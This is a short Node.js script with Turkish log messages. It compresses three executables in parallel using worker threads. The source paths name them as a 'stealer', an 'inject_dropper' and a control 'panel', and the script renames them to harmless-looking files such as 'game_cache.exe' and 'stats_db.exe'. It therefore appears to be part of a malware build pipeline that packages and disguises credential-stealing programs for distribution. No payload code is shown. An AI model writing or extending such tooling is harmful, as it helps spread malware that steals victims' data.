const { Worker } = require('worker_threads');
const path = require('path');
const fs = require('fs');
const os = require('os');

function compressFilesParallel(files, outputDir) {
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

    const tempDir = path.join(os.tmpdir(), 'compress_temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const promises = files.map(({ input, newname }) => {
        return new Promise((resolve, reject) => {
            const tempFile = path.join(tempDir, path.basename(input));
            fs.copyFileSync(input, tempFile);

            const worker = new Worker(path.join(__dirname, 'compress-worker.js'), {
                workerData: { input: tempFile, outputDir, newname }
            });

            worker.on('message', msg => {
                if (msg.status === 'done') {
                    console.log(`✅ ${msg.file} sıkıştırıldı: ${msg.output}`);
                    resolve(msg.output);
                } else if (msg.status === 'error') {
                    console.error(`❌ ${msg.file} hata: ${msg.error}`);
                    reject(msg.error);
                }
            });

            worker.on('error', reject);
        });
    });

    return Promise.all(promises);
}

const exeFiles = [
    { input: path.join(__dirname, '../../Api/exe/panel/builder/panel.exe'), newname: 'game_cache.exe' },
    { input: path.join(__dirname, '../../Api/exe/inject_dropper/builder/dropper.exe'), newname: 'save_data.exe' },
    { input: path.join(__dirname, '../../Api/exe/stealer/builder/stealer.exe'), newname: 'stats_db.exe' }
];

compressFilesParallel(exeFiles, path.join(__dirname, 'compressed'))
    .then(() => {
        console.log('🎉 Tüm dosyalar tamamlandı!');
    })
    .catch(err => {
        console.error('❌ Sıkıştırma sırasında hata:', err);
    });
